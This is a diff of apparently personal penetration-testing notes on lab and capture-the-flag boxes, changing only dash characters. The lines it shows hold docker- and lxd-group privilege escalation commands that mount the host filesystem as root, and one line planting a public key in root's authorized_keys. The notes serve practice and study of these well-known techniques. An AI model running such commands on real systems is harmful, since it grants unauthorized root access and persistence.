@@ -70,14 +70,14 @@ echo 'YOUR_PUBLIC_KEY' >> /mnt/root/root/.ssh/authorized_keys
 
 ## From Your Boxes
 
-> **Web01** (VHL) — User was in the docker group
+> **Web01** (VHL) - User was in the docker group
 > - What worked: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
 > - Lesson: Docker group membership = root. This one-liner mounts the host filesystem and chroots into it. Memorize it.
 
-> **Peppo** (PG) — User eleanor was in the docker group inside a restricted shell
+> **Peppo** (PG) - User eleanor was in the docker group inside a restricted shell
 > - What worked: `docker run -v /:/mnt --rm -it redmine chroot /mnt sh`
 > - Lesson: Same docker breakout technique, but use whatever image is already on the box (redmine here, alpine on Web01). Run `docker images` to see what is available.
 
-> **Tabby** (HTB) — User ash was in the lxd group
+> **Tabby** (HTB) - User ash was in the lxd group
 > - What worked: Built lxd-alpine image on Kali, transferred it, imported as image, then launched container with root filesystem mounted
 > - Lesson: LXD requires more steps than Docker. Build the alpine image with `lxd-alpine-builder` on Kali, transfer, then: `lxc image import`, `lxc init`, `lxc config device add`, `lxc start`, `lxc exec`.
